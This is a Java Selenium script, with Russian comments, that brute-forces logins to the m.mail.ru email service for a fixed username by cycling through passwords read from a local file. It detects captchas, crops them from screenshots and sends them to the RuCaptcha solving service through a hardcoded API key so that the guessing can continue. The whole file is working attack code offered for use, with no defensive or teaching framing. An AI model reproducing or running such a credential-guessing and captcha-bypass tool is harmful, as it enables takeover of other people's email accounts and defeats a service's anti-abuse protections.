import net.marketer.RuCaptcha;
//import org.openqa.selenium.*;
import org.openqa.selenium.*;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;


public class Main {
    private static WebDriver driver;
    private static WebElement err;
    private static String PATH_TO_HOME = "C:\\Users\\snapster\\Desktop\\mbr\\";

    public static boolean login(WebDriver driver, String login, String pass) throws Exception { //попытка авторизации
        try {
            //ждем формы
            WebElement loginInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("Login")));
            WebElement passInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("Password")));
            //заполняем логин и пасс
            loginInput.sendKeys(login);
            passInput.sendKeys(pass);
            //сендим форму
            loginInput.submit();
            System.out.println("Форма отправлена, логин: " + login + " пароль: " + pass);
            checkErrorMsg(driver);
            return true;
        } catch (org.openqa.selenium.TimeoutException e) { //если не нашли все формы
            System.out.println("Не нашли формы для заполнения");
            return false;
        }
    }

    public static boolean checkErrorMsg(WebDriver driver) throws Exception { // чекаем сообщение об ошибке авторизации. Есть - true, не найдено - false.
        try {
            WebElement errorMsg = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.className("error")));
            checkCapcha(driver);
            return true;
        } catch (org.openqa.selenium.TimeoutException e) {
            System.out.println("Сообщение об ошибке авторизации отсутствует");
            checkLogin(driver);
            return false;
        }
    }


    public static boolean checkLogin(WebDriver driver) { // проверяем на предмет успешной авторизации по элементу с id "PH_user-email"
        try {
            err = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.id("PH_user-email")));
            System.out.println(">Залогинились< пароль:^");
            return true;
        } catch (org.openqa.selenium.TimeoutException e) { // если признак успешной авторизации не найден
            System.out.println("Авторизация неуспешна. Наверно что-то с инетом или чет странное, смотри браузер, а да, чуть не забыл, вот тебе стектрейс:" + e);
            return false;
        }
    }

    //###########################ПОСВЯЩЯЮ НИЖЕКОД ЕЁ МЕРЗЕЙШИСТВУ - КАПЧЕ
    public static boolean checkCapcha(WebDriver driver) throws Exception { // чекаем наличие капчи в error месседже
        try {
            WebElement capcha = (new WebDriverWait(driver, 3))
                    .until(ExpectedConditions.presenceOfElementLocated(By.className("js-captcha")));
            System.out.println("Капча детектед, пытаемся разгадать");
            //ВЫЗЫВАЕМ МЕТОД РАЗГАДКИ КАПЧИ
            // по ветке -> нет капчи -> есть еррор месдж -> есть капча -> СЧИТЫВАЕМ ЕЕ
            capchaRecognize(driver, capcha);
            return true;
        } catch (org.openqa.selenium.TimeoutException e) {
            System.out.println("Капча отсутствует");
            // driver.get("https://m.mail.ru/login");
            // по ветке -> нет капчи -> есть еррор месдж -> нет капчи -> НОВАЯ ПОПЫТКА АУНТИФИКАЦИИ
            return false;
        }
    }

    public static File getCapchaImg(WebDriver driver, WebElement element) throws IOException {
        // Делаем скриншот страницы
        File screen = ((TakesScreenshot) driver).getScreenshotAs(OutputType.FILE);
        // Создаем экземпляр BufferedImage для работы с изображением
        BufferedImage img = ImageIO.read(screen);
        // Получаем размеры элемента
        int width = element.getSize().getWidth();
        int height = element.getSize().getHeight();
        // Получаем координаты элемента
        Point p = element.getLocation();
        // Создаем прямоугольник (Rectangle) с размерами элемента
        Rectangle rect = new Rectangle(p, new Dimension(width, height));
        // Вырезаем изображение элемента из общего изображения
        BufferedImage dest = img.getSubimage(p.getX(), p.getY(), rect.width, rect.height);
        // Перезаписываем File screen
        ImageIO.write(dest, "png", screen);
        // Возвращаем File c изображением элемента
        return screen;
    }


    public static void capchaRecognize(WebDriver driver, WebElement capcha) throws Exception { //бомбим в рукапчу

        File imgFile = getCapchaImg(driver, capcha);
        RuCaptcha.API_KEY = "f43320a0f3aaaab016f4ca15f0eb9847";
        String CAPCHA_ID;
        String decryption;

        //отправляем нашу капчу в рукапчу
        String response = RuCaptcha.postCaptcha(imgFile);

        if (response.startsWith("OK")) { //если все капча -> рукапча без проблем

            CAPCHA_ID = response.substring(3); //получаем ID загруженной капчи

            while (true) {

                response = RuCaptcha.getDecryption(CAPCHA_ID); //проверяем, разгаданна ли капча

                if (response.equals(RuCaptcha.Responses.CAPCHA_NOT_READY.toString())) { //если капча еще не разгаданна
                    Thread.sleep(2000); //уходим в сон
                    continue; // начинаем интерацию заново
                } else if (response.startsWith("OK")) { //если разгадана
                    decryption = response.substring(3); //получаем разгаданное значение
                    //попытка ввода в вебформу
                    tryEnterRecognizedCapcha(driver, "234rf34", decryption);
                    break; // заканчиваем цикл
                } else {
                    System.out.println("Рукапча хуевничает");
                }
            }

        }
    }

    public static void tryEnterRecognizedCapcha(WebDriver driver, String pass, String recognizedCapcha) {
        try {
            WebElement passInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("Password")));
            WebElement captchaInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("captcha")));
            //заполняем пасс и капчу
            passInput.sendKeys(pass);
            captchaInput.sendKeys(recognizedCapcha);
            //сендим форму
            captchaInput.submit();
            driver.get("https://m.mail.ru/login");
        } catch (org.openqa.selenium.TimeoutException e) {
            System.out.println("не дождались инпутов при вводе капчи");
        }


    }
//

    //КАПЧА ТЫ ИЗИ END


    public static void main(String[] args) throws Exception {
        //#########################################################
        ArrayList<String> passwordFromFile = new ArrayList<String>();
        Files.lines(Paths.get(PATH_TO_HOME + "pss1.txt"), StandardCharsets.UTF_8).forEach(passwordFromFile::add);
        System.setProperty("webdriver.gecko.driver", "c:\\geckodriver.exe");
        WebDriver driver = new FirefoxDriver();
        driver.manage().window().maximize();
        driver.get("https://m.mail.ru/login");
        //#########################################################

        for (String pass : passwordFromFile) {
            // чекаем есть ли капча
            if (!checkCapcha(driver)) { //капчи нет
                login(driver, "origamycpa2", pass);
            } else { //капча есть
                //реализовано в методе checkCapcha
            }

        }


    }
}